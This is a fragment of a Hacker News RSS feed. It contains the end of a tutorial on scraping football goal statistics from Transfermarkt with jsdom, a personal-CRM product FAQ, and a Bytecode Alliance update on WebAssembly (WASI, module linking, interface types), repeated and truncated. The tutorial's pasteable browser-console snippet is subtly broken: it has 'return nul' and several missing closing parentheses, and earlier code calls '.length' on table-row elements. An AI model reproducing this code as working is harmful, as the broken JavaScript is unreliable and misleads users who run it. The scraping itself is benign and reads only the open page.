module<span>.</span>exports <span>=</span> <span>{</span>loadMessiGoals<span>}</span></code></pre></div>
<h2>Tools for parsing</h2>
<p>There are two major alternatives for this task which are conveniently represented with two high-quality most-starred and alive libraries.</p>
<figure>
    <span>
      <a href="https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/242b2/parsing-tools.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="cheerio vs jsdom" title="We will use one of them" src="https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/37523/parsing-tools.png" srcset="https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/e9ff0/parsing-tools.png 180w,
https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/f21e7/parsing-tools.png 360w,
https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/37523/parsing-tools.png 720w,
https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/302a4/parsing-tools.png 1080w,
https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/07a9c/parsing-tools.png 1440w,
https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/242b2/parsing-tools.png 5120w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>We will use one of them</figcaption>
  </figure>
<p>The first approach is just to build a syntax tree from a markup text and then navigate it with familiar browser-like syntax. This one is fully covered with <a href="https://github.com/cheeriojs/cheerio">cheerio</a> that declared as <code>jQuery for server</code> (IMO, they need to revise their marketing vibes for 2020).</p>
<p>The second way is to build the whole browser DOM but without a browser itself. We can do this with wonderful <a href="https://github.com/jsdom/jsdom">jsdom</a> which is <code>node.js implementation of many web standards</code>.</p>
<p>Let’s take a closer look at both of them.</p>
<h3>cheerio</h3>
<p>Despite these analogies cheerio doesn’t have jQuery in dependencies, it just tries to reimplement most known methods from scratch:</p>
<div data-language="json"><pre><code> <span>"dependencies"</span><span>:</span> <span>{</span>
  <span>"@types/node"</span><span>:</span> <span>"^14.11.2"</span><span>,</span>
  <span>"css-select"</span><span>:</span> <span>"~3.1.0"</span><span>,</span>
  <span>"dom-serializer"</span><span>:</span> <span>"~1.1.0"</span><span>,</span>
  <span>"entities"</span><span>:</span> <span>"~2.1.0"</span><span>,</span>
  <span>"htmlparser2"</span><span>:</span> <span>"^5.0.0"</span><span>,</span>
  <span>"lodash"</span><span>:</span> <span>"^4.17.20"</span><span>,</span>
  <span>"parse5"</span><span>:</span> <span>"^6.0.0"</span><span>,</span>
  <span>"parse5-htmlparser2-tree-adapter"</span><span>:</span> <span>"^6.0.0"</span>
<span>}</span></code></pre></div>
<p>Basic usage is really easy:</p>
<ul>
<li>
<p>you load a HTML</p>
<div data-language="js"><pre><code><span>const</span> $ <span>=</span> cheerio<span>.</span><span>load</span><span>(</span><span>'&lt;ul id="steps"&gt;...&lt;/ul&gt;'</span><span>)</span></code></pre></div>
</li>
<li>
<p>done, you’re great, now you can use JQ selectors/methods</p>

</li>
</ul>
<p>Probably you can pick this one if you need to save on size (cheerio is lightweight and fast) or you are really familiar with jQuery syntax and for some reason want to bring it to your new project. Cheerio is a nice way to do any kind of work with HTML you need in your application.</p>
<h3>jsdom</h3>
<p>This one is a bit more complicated: it tries to emulate part of the whole browser that is working with HTML and JS (apart from rendering the result). It’s used heavily for testing and … well scraping.</p>
<p>Let’s spin up jsdom:</p>
<ul>
<li>
<p>you need to use a constructor with your HTML</p>
<div data-language="js"><pre><code><span>const</span> dom <span>=</span> <span>new</span> <span>JSDOM</span><span>(</span><span>'&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;'</span><span>)</span></code></pre></div>
</li>
<li>
<p>then you can access standard browser API</p>
<div data-language="js"><pre><code>dom<span>.</span>window<span>.</span>document<span>.</span><span>querySelector</span><span>(</span><span>"p"</span><span>)</span><span>.</span>textContent</code></pre></div>
</li>
</ul>
<p>jsdom is a lot heavier and it does a lot more job. You should understand, why to choose it over other options.</p>
<h2>Parsing</h2>
<p>In our example, I want to stick to the jsdom. It will help us to show one last approach at the end of the article. The parsing part is really vital but very short.</p>
<p>So we’ll start with building a dom from the fetched HTML:</p>
<div data-language="js"><pre><code><span>const</span> dom <span>=</span> <span>new</span> <span>JSDOM</span><span>(</span>goalsHTML<span>)</span></code></pre></div>
<p>Then you can select table content with css selector and browser API. Don’t forget to create a real array from <code>NodeList</code> that <code>querySelectorAll</code> returns.</p>
<div data-language="js"><pre><code><span>const</span> rows <span>=</span> Array<span>.</span><span>from</span><span>(</span>
  dom<span>.</span>window<span>.</span>document<span>.</span><span>querySelectorAll</span><span>(</span><span>'.responsive-table tbody tr'</span><span>)</span>
<span>)</span></code></pre></div>
<p>Now you have a two-dimensional array to work with. This part is finished, now you need to process this data to get clean and ready-to-work-with stats.</p>
<h2>Processing</h2>
<p>First, let’s check the lengths of our rows. Each row is the stat about goal and we mostly don’t care how many do we have. But each row can contain numbers in a different format so we have to deal with them.</p>
<p>We map over rows and get the length. Then we deduplicate results to see what options do we have here.</p>
<div data-language="js"><pre><code><span>const</span> lengths <span>=</span> rows<span>.</span><span>map</span><span>(</span><span>row</span> <span>=&gt;</span> row<span>.</span>length<span>)</span>
<span>const</span> result <span>=</span> <span>[</span><span>...</span><span>new</span> <span>Set</span><span>(</span>lengths<span>)</span><span>]</span>
</code></pre></div>
<p>Not that bad, only 4 different shapes: with 1, 5, 14, and 15 cells.
</p><figure>
    <span>
      <a href="https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/55681/rows-example.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="All the possible row cases" title="All the possible row cases" src="https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/37523/rows-example.png" srcset="https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/e9ff0/rows-example.png 180w,
https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/f21e7/rows-example.png 360w,
https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/37523/rows-example.png 720w,
https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/302a4/rows-example.png 1080w,
https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/07a9c/rows-example.png 1440w,
https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/55681/rows-example.png 2062w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>All the possible row cases</figcaption>
  </figure>
<p>Since we don’t need rank data from extra cell in 15-cells case it is safe to delete it.</p>
<div data-language="js"><pre><code><span>const</span> <span>omitRank</span> <span>=</span> <span>(</span><span>row</span><span>)</span> <span>=&gt;</span>
  row<span>.</span>length <span>===</span> <span>15</span> <span>?</span> <span>[</span><span>...</span>row<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>5</span><span>)</span><span>,</span> <span>...</span>row<span>.</span><span>slice</span><span>(</span><span>6</span><span>)</span><span>]</span> <span>:</span> row</code></pre></div>
<p>Row with only one cell is actually useless: it is just a name of the season, so we will skip it.</p>
<div data-language="js"><pre><code><span>if</span> <span>(</span>row<span>.</span>length <span>===</span> <span>1</span><span>)</span> <span>return</span> <span>null</span></code></pre></div>
<p>For the 5-cells case (when player scored few goals in one match) we need to find previous full row and use it’s data for empty stats.</p>
<div data-language="js"><pre><code><span>const</span> <span>getLastMatch</span> <span>=</span> <span>(</span><span>idx<span>,</span> goals</span><span>)</span> <span>=&gt;</span>
  goals<span>[</span>idx<span>]</span><span>.</span>length <span>===</span> <span>14</span> <span>?</span> goals<span>[</span>idx<span>]</span> <span>:</span> <span>getLastMatch</span><span>(</span>idx <span>-</span> <span>1</span><span>,</span> goals<span>)</span>

<span>const</span> match <span>=</span> <span>getLastMatch</span><span>(</span>idx<span>,</span> goals<span>)</span>
<span>const</span> isSameMatch <span>=</span> row<span>.</span>length <span>===</span> <span>14</span></code></pre></div>
<p>Now we just have to manually map data to keys, nothing scientific here and no smart way to avoid it.</p>
<div data-language="js"><pre><code><span>return</span> <span>{</span>
  competition<span>:</span> match<span>[</span><span>1</span><span>]</span><span>,</span>
  matchday<span>:</span> match<span>[</span><span>2</span><span>]</span><span>,</span>
  date<span>:</span> match<span>[</span><span>3</span><span>]</span><span>,</span>
  venue<span>:</span> match<span>[</span><span>4</span><span>]</span><span>,</span>
  opponent<span>:</span> match<span>[</span><span>7</span><span>]</span><span>,</span>
  result<span>:</span> match<span>[</span><span>8</span><span>]</span><span>,</span>
  position<span>:</span> match<span>[</span><span>9</span><span>]</span><span>,</span>
  minute<span>:</span> row<span>[</span><span>1</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
  atScore<span>:</span> row<span>[</span><span>2</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
  goalType<span>:</span> row<span>[</span><span>3</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
  assist<span>:</span> row<span>[</span><span>4</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
<span>}</span></code></pre></div>
<h2>Saving</h2>
<p>We would just dump our result to a file, converting it to a string first with the <code>JSON.stringify</code> method.</p>
<div data-language="js"><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>'fs'</span><span>)</span><span>.</span>promises

<span>const</span> <span>saveStats</span> <span>=</span> <span>async</span> <span>(</span><span>data</span><span>)</span> <span>=&gt;</span> <span>{</span>
  fs<span>.</span><span>writeFile</span><span>(</span><span>'./data.json'</span><span>,</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span>data<span>)</span><span>)</span>
<span>}</span></code></pre></div>
<blockquote>
<h2>Bonus: One-time parsing with a snippet</h2>
</blockquote>
<p>Since we used <code>jsdom</code> with the browser-compatible API we actually don’t need any node environment to parse the data. If we just need it once from a particular page we can just run some code at the <code>Console</code> tab in the developers tools of your browser. Try to open <a href="https://www.transfermarkt.com/cristiano-ronaldo/alletore/spieler/8198/plus/1">any player stats on Transfermarkt</a> and paste this giant non-readable snippet to the console:</p>
<div data-language="js"><pre><code><span>let</span> data <span>=</span> Array<span>.</span><span>from</span><span>(</span>
  document<span>.</span><span>querySelectorAll</span><span>(</span><span>'.responsive-table table tbody tr'</span><span>)</span>
<span>)</span><span>.</span><span>map</span><span>(</span>
  <span>row</span> <span>=&gt;</span> Array<span>.</span><span>from</span><span>(</span>row<span>.</span>children<span>)</span><span>.</span><span>map</span><span>(</span><span>node</span> <span>=&gt;</span> node<span>.</span>textContent<span>.</span><span>trim</span><span>(</span><span>)</span><span>)</span>
<span>)</span><span>.</span><span>map</span><span>(</span>
  <span>(</span><span>row</span><span>)</span> <span>=&gt;</span> row<span>.</span>length <span>===</span> <span>15</span> <span>?</span> <span>[</span><span>...</span>row<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>5</span><span>)</span><span>,</span> <span>...</span>row<span>.</span><span>slice</span><span>(</span><span>6</span><span>)</span><span>]</span> <span>:</span> row
<span>)</span><span>.</span><span>map</span><span>(</span>
  <span>(</span><span>row<span>,</span> idx<span>,</span> goals</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>if</span> <span>(</span>row<span>.</span>length <span>===</span> <span>1</span><span>)</span> <span>return</span> nul

  <span>const</span> <span>getLastMatch</span> <span>=</span> <span>(</span><span>idx<span>,</span> goals</span><span>)</span> <span>=&gt;</span>
    goals<span>[</span>idx<span>]</span><span>.</span>length <span>===</span> <span>14</span> <span>?</span> goals<span>[</span>idx<span>]</span> <span>:</span> <span>getLastMatch</span><span>(</span>idx <span>-</span> <span>1</span><span>,</span> goals
  <span>const</span> match <span>=</span> <span>getLastMatch</span><span>(</span>idx<span>,</span> goals
  <span>const</span> isSameMatch <span>=</span> row<span>.</span>length <span>===</span> <span>14</span>

  <span>return</span> <span>{</span>
    competition<span>:</span> match<span>[</span><span>1</span><span>]</span><span>,</span>
    matchday<span>:</span> match<span>[</span><span>2</span><span>]</span><span>,</span>
    date<span>:</span> match<span>[</span><span>3</span><span>]</span><span>,</span>
    venue<span>:</span> match<span>[</span><span>4</span><span>]</span><span>,</span>
    opponent<span>:</span> match<span>[</span><span>7</span><span>]</span><span>,</span>
    result<span>:</span> match<span>[</span><span>8</span><span>]</span><span>,</span>
    position<span>:</span> match<span>[</span><span>9</span><span>]</span><span>,</span>
    minute<span>:</span> row<span>[</span><span>1</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
    atScore<span>:</span> row<span>[</span><span>2</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
    goalType<span>:</span> row<span>[</span><span>3</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
    assist<span>:</span> row<span>[</span><span>4</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
  <span>}</span><span>}</span>
<span>)</span><span>.</span><span>filter</span><span>(</span>Boolean<span>)</span></code></pre></div>
<p>And now just apply this magic <code>copy</code> function that is integrated into the browser devtools. It would copy data to your clipboard.</p>

<p>Not that hard, right? And no need to deal with <code>pip</code> anymore. I hope you found this article useful. Stay tuned, next time we will visualize this scraped data with modern JS libs.</p>
<p>You can find whole script for this article in the following codesandbox:</p>
</div></div>]]>
            </description>
            <link>https://qoob.cc/web-scraping/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24898016</guid>
            <pubDate>Mon, 26 Oct 2020 16:34:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Personal CRM: Note taking, the way it should be]]>
            </title>
            <description>
<![CDATA[
Score 171 | Comments 119 (<a href="https://news.ycombinator.com/item?id=24897812">thread link</a>) | @nathanganser
<br/>
October 26, 2020 | https://nat.app/calendar | <a href="https://web.archive.org/web/*/https://nat.app/calendar">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3>Can I export my notes?</h3><p>Of course, just email us at <a href="mailto:export@nat.app">export@nat.app</a> and we'll send you a CSV with all the notes you've taken.</p></div><div><h3>Will you stick around?</h3><p>Yes. Because we are building this for ourselves. We need this product as much as you do. Also, we're profitable and bootstrapped.</p></div><div><h3>Is my data safe?</h3><p>Yes, we don't read your emails and use top-notch security standards. Check out our page on privacy (link in the header) to find out more.</p></div><div><h3>I have a question (or a problem?)</h3><p>We're always available. Just email us at <a href="mailto:question@nat.app">question@nat.app</a> and we'll get back to you (or fix your issue!)</p></div></div></div>]]>
            </description>
            <link>https://nat.app/calendar</link>
            <guid isPermaLink="false">hacker-news-small-sites-24897812</guid>
            <pubDate>Mon, 26 Oct 2020 16:20:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fastly hires entire Wasmtime team from Mozilla]]>
            </title>
            <description>
<![CDATA[
Score 802 | Comments 134 (<a href="https://news.ycombinator.com/item?id=24897641">thread link</a>) | @swyx
<br/>
October 26, 2020 | https://bytecodealliance.org/articles/1-year-update#the-lucet-and-wasmtime-teams-join-forces | <a href="https://web.archive.org/web/*/https://bytecodealliance.org/articles/1-year-update#the-lucet-and-wasmtime-teams-join-forces">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>We announced the Bytecode Alliance nearly a year ago, and since then it has been… quite a year 😬</p>

<p>While the 2020-ness of this year has slowed us down on some fronts, we’ve also made a lot of progress on others.</p>

<p>Now that we’ve adjusted to the new normal, we’re gearing up to accelerate on <em>all</em> fronts. But before we do that, we wanted to share some highlights of what we’ve achieved to date.</p>

<h2 id="progress-on-the-nanoprocess-model">Progress on the nanoprocess model</h2>

<p>Our goal is to evolve WebAssembly from a compilation target that you compile monolithic applications <em>to</em>, to a modular ecosystem that you compose applications <em>from</em>.</p>

<p>As we do this, we have a chance to fix many longstanding problems with the way software is developed. For example, we can make it much safer for your application to use dependencies that you didn’t code yourself.</p>

<p>This is why the <a href="https://hacks.mozilla.org/2019/11/announcing-the-bytecode-alliance/">nanoprocess model</a> is so important. It’s the paradigm shift necessary to empower developers to defend themselves against these problems.</p>

<p>There are three core pieces of the nanoprocess model that are still in progress:</p>
<ul>
  <li>WASI, the WebAssembly System Interface</li>
  <li>Module linking</li>
  <li>Interface types</li>
</ul>

<p>You can think of WASI as the way that the host and a WebAssembly module talk to each other.</p>

<p>You can think of module linking as the way that two WebAssembly modules talk to each other.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-wasi-module-linking.png" alt="On the left, a WebAssembly module and host talking to each other using WASI. On the right, two WebAssembly modules talking to each other using module linking."></p>

<p>In both of these cases, the two sides are often written in different source languages. This means they might represent values and handles to resources in different ways. Basically, they speak foreign languages.</p>

<p>Interface types are like a foreign-language dictionary that the engine uses to help them communicate.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-interface-types.png" alt="On both sides, the engine helps the two talk to each other using interface types."></p>

<p>Let’s see where the work on these stands today.</p>

<p><em>Note: The Bytecode Alliance doesn’t host specifications. While BA members are driving specs mentioned below, they are doing that in collaboration with others in the W3C WebAssembly CG. Bytecode Alliance projects include implementations of these specs.</em></p>

<h3 id="wasi-the-webassembly-system-interface">WASI, the WebAssembly System Interface</h3>

<p>When we introduced WASI, we compared it to <a href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> and other system interfaces. That was a bit of an oversimplification, though.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasi-low-level.png" alt="A file directory structure on the left, with a protective barrier in the middle containing the operating system kernel, and an application knocking for access on the right"></p>

<p>While WASI does aim to provide a set of standardized modules that provide these low-level system interface operations, we also intend to standardize modules for specialized higher-level host APIs.</p>

<p>We’ve made progress on both of these fronts.</p>

<h4 id="low-level-system-interface-level">Low-level system interface level</h4>
<p>For the low-level system interface level, the work has been focused on quality of implementation.</p>

<p>On the spec side, that has been identifying and addressing problems with cross-platform implementability of the spec. One example of this is the <a href="https://github.com/WebAssembly/WASI/pull/312"><code>wasi-socket</code></a> API (which was <a href="https://radu-matei.com/blog/towards-sockets-networking-wasi/">recently prototyped in Wasmtime</a>). In this case, the conversation has centered on the right way to apply capabilities-based security to the handling of sockets.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/portability.png" alt="A .wasm file running across three different operating systems"></p>

<p>On the implementation side, we’ve done a lot of work to improve the security and reliability of our implementation. Part of this has been developing robust fuzzing measures (which we describe more below).</p>

<p>Another thing we’ve done is factored out the security-critical operations into a dedicated library, <a href="https://github.com/bytecodealliance/cap-std"><code>cap-std</code></a>. It’s a cross-platform library which provides much of the functionality of Rust’s standard library in a capabilities-oriented way. This allows us to fully focus on getting those security-critical foundations right on all platforms. As a next step, we’ll make use of <code>cap-std</code> in our WASI implementation.</p>

<h4 id="specialized-higher-level-host-apis">Specialized higher-level host APIs</h4>
<p>For the specialized higher-level host APIs, there has been exciting work on proposals for completely new API modules.</p>

<p>One great example of this is <a href="https://github.com/WebAssembly/wasi-nn"><code>wasi-nn</code></a>, which is a <a href="https://www.youtube.com/watch?v=6O44X76rgIg">standardized interface for neural networking</a>. This is useful because trained machine learning models are typically deployed on a variety of different devices with different architectures and operating systems. Using <code>wasi-nn</code>, the <code>.wasm</code> file can do things like describe tensors and execute inference requests in a portable way, regardless of the underlying ISA and OS.</p>

<p>We’re implementing all of these in Wasmtime as they develop. That way, people can try them out and real world usage can inform the specification.</p>

<h3 id="module-linking">Module linking</h3>

<p>If we’re going to have an ecosystem of reusable code, we need a good way to link modules together.</p>

<p>Right now, you can link modules together using host APIs. For example, on the web you can string together a bunch of <code>WebAssembly.instantiate</code> calls to link a set of modules together. In Wasmtime, you use the <a href="https://bytecodealliance.github.io/wasmtime/examples-c-linking.html">linker APIs</a>.</p>

<p>But there are a few downsides to this imperative style, including the fact that it’s fairly cumbersome, not that fast and requires the host to include some type of garbage or cycle collector.</p>

<p>With the module linking proposal, linking becomes declarative. This means that it’s much easier to use. It also means that even at compile time, the engine has all of the information about how modules are connected to each other. This opens up lots of potential optimizations and features and removes the possibility of cycles.</p>

<p>For now, we’re focusing on load-time linking, which will enable modules to factor out common library code. And for that, the proposal is pretty much complete. Longer term, we’ll be able to add run-time dynamic linking as well.</p>

<p>Our next step is to finish a prototype implementation, which should be complete within the next few months.</p>

<h3 id="interface-types">Interface types</h3>

<p>The <a href="https://github.com/WebAssembly/interface-types">Interface Types proposal</a> is evolving nicely.</p>

<p>Interface Types can now talk about a rich set of values. The design is also more efficient now, removing the need for an intermediate copy of values in almost all cases.</p>

<p>So what’s left to do in the short term?</p>

<p>While Interface Types can talk about values, they can’t yet talk about <a href="https://github.com/WebAssembly/interface-types/issues/87">handles to resources</a> and <a href="https://github.com/WebAssembly/interface-types/issues/68">buffers</a>. Both are important to support WASI and other APIs, because things like files should use handles, and it should be possible to read a file and write directly into a buffer.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/interface-types.png" alt="On the left, types that are done, including strings, numbers, references, booleans, enums, objects, and unions. On the right, types left to be done: handles and buffers."></p>

<p>Once those features are in place, Interface Types will have everything it needs to support both WASI and Module Linking, making it possible for them to talk about values and resources in a source-language independent way. So we’ll continue working on the spec in the W3C.</p>

<p>On the implementation, we’ve set the stage to execute quickly. We’ve already implemented the new features in Wasm core which Interface Types depend on, such as <a href="https://bytecodealliance.org/articles/bytecodealliance.org/articles/reference-types-in-wasmtime">Reference Types</a>, <a href="https://bytecodealliance.org/articles/multi-value-all-the-wasm">multi-value</a>, and <a href="https://github.com/bytecodealliance/wasmtime/pull/2263">multi-memory support</a>.</p>

<p>We’re also working on tools for using Interface Types. Currently, people can use <a href="https://github.com/rustwasm/wasm-bindgen"><code>wasm-bindgen</code></a> to create bindings for JS code. In the coming year, we’ll add direct support for Interface Types to language toolchains, <a href="https://github.com/bytecodealliance/wasm-interface-types">starting with Rust</a>.</p>

<p>We expect to complete most of this work within the next six months.</p>

<p>In the meantime, for people wanting to get things done today but in a forward compatible way, you can define your interface using <a href="https://github.com/WebAssembly/WASI/blob/master/docs/witx.md">WITX</a>. You can learn more about how to do this from <a href="https://www.youtube.com/watch?v=LCA9NnH7DxE">this presentation</a> by Pat Hickey, or <a href="https://radu-matei.com/blog/wasm-api-witx/">this blog post</a> from Radu Matei.</p>

<h2 id="supporting-more-languages">Supporting more languages</h2>

<p>To bring the nanoprocess model to as many people as possible, we need to integrate with as many languages as possible.</p>

<h3 id="more-languages-compiling-into-the-webassembly-nanoprocess-model">More languages compiling into the WebAssembly nanoprocess model</h3>

<p>If you want to produce code that uses the nanoprocess model, you need a compiler that:</p>
<ol>
  <li>can target WebAssembly, and</li>
  <li>has support for these cutting edge standards</li>
</ol>

<p>To help language communities speed up their adoption, we’ve started building out <a href="https://github.com/bytecodealliance/wasm-tools"><code>wasm-tools</code></a>. This is a standard set of tools that other compilers can use to target WebAssembly.</p>

<p>These are all tools that we use in Wasmtime, so as new WebAssembly features come online, they are supported here. For example, we’ve already started building support for module-linking into these tools.</p>

<p>The tools currently include:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmparser"><code>wasmparser</code></a>, which is a parser for WebAssembly files. It’s quite cheap because it doesn’t do any extra allocations, and can parse in a streaming fashion.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmprinter"><code>wasmprinter</code></a>, which translates a .wasm binary format into the .wat text format, which is useful for debugging and testing.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wat"><code>wat</code></a> and <a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wast"><code>wast</code></a>, which translate the .wat and .wast text formats into the binary format, which is useful for running tests (since it’s easier to maintain tests in the text format).</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasm-smith"><code>wasm-smith</code></a>, which is a <a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">test case generator</a>. It generates pseudo-random Wasm modules, guaranteed to be valid Wasm modules, which we use for fuzzing.</li>
</ul>

<p>We will be adding more tools over the next year. For example, we will host the language-independent parts of the <a href="https://github.com/bytecodealliance/wasm-interface-types">Rust Interface Types toolkit</a> in <code>wasm-tools</code>, which will make it easier for languages that compile to WebAssembly to start supporting Interface Types. We also plan to collaborate with language communities on integrating these tools as they come online.</p>

<h3 id="more-languages-embedding-webassembly-via-wasmtime">More languages embedding WebAssembly via Wasmtime</h3>

<p>If you have a whole WebAssembly application, you can run that directly in a runtime like Wasmtime. But sometimes, you just want to run a little bit of WebAssembly in your project.</p>

<p>For example, you might be writing some Python code, but want to do some intensive computations. Python may be too slow, and native extensions may be too frustrating to use portably, so you could use a WebAssembly module instead.</p>

<p>Wasmtime is enabling this for many languages, through embeddings into the language runtimes.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasmtime-embedding.png" alt="&quot;Wasmtime in the center, with arrows pointing to logos for all of the languages listed below&quot;"></p>

<p>These languages now have support for running WebAssembly in Wasmtime:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasmtime-py">Python</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-go">Go</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-dotnet">.NET</a></li>
  <li>Java (two options: <a href="https://github.com/kawamuray/wasmtime-java">kawamuray/wasmtime-java</a> or <a href="https://github.com/bluejekyll/wasmtime-java">bluejekyll/wasmtime-java</a>)</li>
  <li><a href="https://metacpan.org/pod/Wasm">Perl</a></li>
  <li><a href="https://bytecodealliance.github.io/wasmtime/lang-rust.html">Rust</a></li>
  <li><a href="https://github.com/kubkon/wasmtime-zig">Zig</a></li>
  <li><a href="https://github.com/dtcristo/wasmtime-ruby">Ruby</a></li>
</ul>

<p>As new nanoprocess features come online, they get added to Wasmtime. We don’t consider feature development complete until the feature is exposed in the language embeddings that we maintain. That means that these languages can run the most cutting-edge WebAssembly modules as soon as possible.</p>

<p>It also means that these language communities don’t have to come up with their own ways of doing linking and binding. They can just depend on the WebAssembly standards, which makes everything more interoperable.</p>

<p>In the last year, we’ve transitioned the embeddings we maintain to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bytecodealliance.org/articles/1-year-update#the-lucet-and-wasmtime-teams-join-forces">https://bytecodealliance.org/articles/1-year-update#the-lucet-and-wasmtime-teams-join-forces</a></em></p>]]>
            </description>
            <link>https://bytecodealliance.org/articles/1-year-update#the-lucet-and-wasmtime-teams-join-forces</link>
            <guid isPermaLink="false">hacker-news-small-sites-24897641</guid>
            <pubDate>Mon, 26 Oct 2020 16:06:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bytecode Alliance: One year update]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24897633">thread link</a>) | @patrickmcmanus
<br/>
October 26, 2020 | https://bytecodealliance.org/articles/1-year-update | <a href="https://web.archive.org/web/*/https://bytecodealliance.org/articles/1-year-update">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>We announced the Bytecode Alliance nearly a year ago, and since then it has been… quite a year 😬</p>

<p>While the 2020-ness of this year has slowed us down on some fronts, we’ve also made a lot of progress on others.</p>

<p>Now that we’ve adjusted to the new normal, we’re gearing up to accelerate on <em>all</em> fronts. But before we do that, we wanted to share some highlights of what we’ve achieved to date.</p>

<h2 id="progress-on-the-nanoprocess-model">Progress on the nanoprocess model</h2>

<p>Our goal is to evolve WebAssembly from a compilation target that you compile monolithic applications <em>to</em>, to a modular ecosystem that you compose applications <em>from</em>.</p>

<p>As we do this, we have a chance to fix many longstanding problems with the way software is developed. For example, we can make it much safer for your application to use dependencies that you didn’t code yourself.</p>

<p>This is why the <a href="https://hacks.mozilla.org/2019/11/announcing-the-bytecode-alliance/">nanoprocess model</a> is so important. It’s the paradigm shift necessary to empower developers to defend themselves against these problems.</p>

<p>There are three core pieces of the nanoprocess model that are still in progress:</p>
<ul>
  <li>WASI, the WebAssembly System Interface</li>
  <li>Module linking</li>
  <li>Interface types</li>
</ul>

<p>You can think of WASI as the way that the host and a WebAssembly module talk to each other.</p>

<p>You can think of module linking as the way that two WebAssembly modules talk to each other.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-wasi-module-linking.png" alt="On the left, a WebAssembly module and host talking to each other using WASI. On the right, two WebAssembly modules talking to each other using module linking."></p>

<p>In both of these cases, the two sides are often written in different source languages. This means they might represent values and handles to resources in different ways. Basically, they speak foreign languages.</p>

<p>Interface types are like a foreign-language dictionary that the engine uses to help them communicate.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-interface-types.png" alt="On both sides, the engine helps the two talk to each other using interface types."></p>

<p>Let’s see where the work on these stands today.</p>

<p><em>Note: The Bytecode Alliance doesn’t host specifications. While BA members are driving specs mentioned below, they are doing that in collaboration with others in the W3C WebAssembly CG. Bytecode Alliance projects include implementations of these specs.</em></p>

<h3 id="wasi-the-webassembly-system-interface">WASI, the WebAssembly System Interface</h3>

<p>When we introduced WASI, we compared it to <a href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> and other system interfaces. That was a bit of an oversimplification, though.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasi-low-level.png" alt="A file directory structure on the left, with a protective barrier in the middle containing the operating system kernel, and an application knocking for access on the right"></p>

<p>While WASI does aim to provide a set of standardized modules that provide these low-level system interface operations, we also intend to standardize modules for specialized higher-level host APIs.</p>

<p>We’ve made progress on both of these fronts.</p>

<h4 id="low-level-system-interface-level">Low-level system interface level</h4>
<p>For the low-level system interface level, the work has been focused on quality of implementation.</p>

